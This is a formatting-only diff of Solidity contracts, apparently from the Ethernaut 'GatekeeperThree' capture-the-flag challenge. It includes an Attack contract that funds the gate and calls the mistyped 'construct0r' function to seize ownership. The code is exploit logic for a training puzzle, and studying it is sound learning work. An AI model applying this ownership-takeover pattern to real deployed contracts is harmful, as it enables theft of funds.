@@ -4,13 +4,13 @@ pragma solidity ^0.8.0;
 contract SimpleTrick {
     GatekeeperThree public target;
     address public trick;
-    uint private password = block.timestamp;
+    uint256 private password = block.timestamp;
 
     constructor(address payable _target) {
         target = GatekeeperThree(_target);
     }
 
-    function checkPassword(uint _password) public returns (bool) {
+    function checkPassword(uint256 _password) public returns (bool) {
         if (_password == password) {
             return true;
         }
@@ -52,15 +52,12 @@ contract GatekeeperThree {
     }
 
     modifier gateThree() {
-        if (
-            address(this).balance > 0.001 ether &&
-            payable(owner).send(0.001 ether) == false
-        ) {
+        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
             _;
         }
     }
 
-    function getAllowance(uint _password) public {
+    function getAllowance(uint256 _password) public {
         if (trick.checkPassword(_password)) {
             allowEntrance = true;
         }
@@ -88,7 +85,7 @@ contract Attack {
     function attack() external payable {
         require(msg.value > 0.001 ether);
 
-        (bool ok, ) = address(gate).call{value: msg.value}(""); // send eth for gate three
+        (bool ok,) = address(gate).call{value: msg.value}(""); // send eth for gate three
         require(ok);
 
         gate.construct0r(); // owner = address(this) -> gate 1
